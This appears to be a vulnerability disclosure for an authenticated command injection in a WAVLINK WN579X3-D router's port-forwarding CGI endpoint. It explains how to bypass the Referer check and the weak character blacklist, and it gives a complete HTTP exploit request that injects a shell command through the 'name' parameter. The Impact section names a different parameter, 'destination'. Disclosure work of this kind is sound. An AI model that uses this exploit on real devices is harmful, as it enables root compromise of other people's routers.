# WAVLINK WN579X3-D Router

-  Vendor: WAVLINK
- Product: WAVLINK WN579X3-D
-  Firmware Version: M79X3D.V250402 (M_V250402)
-  Vulnerability Type:Authenticated Command Injection

# Description

The authenticated command injection vulnerability in the `port_forward` function of `/cgi-bin/wapi.cgi` on the WAVLINK WN579X3-D router (firmware version M79X3D.V250402) can be exploited through the controllable `name` parameter, leading to remote code execution with root privileges.

## Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

## Vulnerability Details

The vulnerability is triggered in the `sub_405B5C` function, involving the user-controlled `name` parameter. The input validation performed by `sub_4169A0` is based on a weak blacklist mechanism that fails to block many  dangerous special characters, allowing attackers to easily bypass the  filter. The unsanitized input is then copied via `strncpy(v51, v26, 31)`, used to construct a system command through `snprintf`, and finally executed by `popen`, resulting in an OS command injection vulnerability.

It only performs login verification and Referer checking.

<img width="1687" height="481" alt="图片" src="https://github.com/user-attachments/assets/570f6b27-bbad-4f9e-a995-852df2b92927" />


The Referer check in `sub_402224` is virtually useless / effectively nonexistent.

<img width="2181" height="989" alt="图片" src="https://github.com/user-attachments/assets/e3eb5ae0-527c-4ba7-a33e-62e120ceaf96" />


To bypass the check, avoid the following two conditions:

- The string "html" appears **exactly 2 times** in the Referer.
- The string "html" appears **exactly 1 time** and the string "main" appears **exactly 1 time** in the Referer.

Then proceed down the `function=set` branch.

<img width="1278" height="644" alt="图片" src="https://github.com/user-attachments/assets/ffd5eb88-91f4-4f4a-8055-02fcd8ce2cad" />


Now we arrive at the injectable `name` parameter. The function `sub_4169A0` acts as a blacklist filter that performs string validation on the user-supplied `name` input.

<img width="1631" height="655" alt="图片" src="https://github.com/user-attachments/assets/bb84cb90-f82e-467b-a68e-39c14a0baca5" />


Only backticks (```) and semicolons (`;`) are filtered.
This is the weakness. As a result, we can still use other characters such as `|`, `>`, `&`, etc. to bypass the filter and construct command injection payloads.
Further down, the `popen` function is called to execute the constructed command.

<img width="1817" height="632" alt="图片" src="https://github.com/user-attachments/assets/08e34013-45c9-4b06-9530-55a7df132e8c" />


First, log in to obtain a valid cookie.

<img width="1248" height="586" alt="图片" src="https://github.com/user-attachments/assets/5b8bc95c-6945-40b0-9b89-77bcb78dabf2" />


**exp**

```http
POST /cgi-bin/wapi.cgi?x=1&opt=port_forward&function=set&act=add&ip=1.1.1.1&out_port=80&in_port=80&proto=tcp&name=|%20echo%20rce%20>/test  HTTP/1.1

Host: 127.0.0.1:8080

Content-Length: 0

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Origin: http://127.0.0.1:8080

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: http://127.0.0.1:8080/main.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: i18next=en_US; lstatus=true; token=0C69E79B8F4F907D59343442063953FB

Connection: close
```

**Prior to execution**

<img width="1146" height="294" alt="图片" src="https://github.com/user-attachments/assets/a82a22eb-50ca-4a28-9096-e301ddf49d20" />


## Reproduction Result

<img width="1349" height="642" alt="图片" src="https://github.com/user-attachments/assets/293aed99-58a7-4705-992c-96f6626b020e" />

<img width="1181" height="327" alt="图片" src="https://github.com/user-attachments/assets/9265579c-2296-4b2a-a2b9-eb69ae2a4d41" />
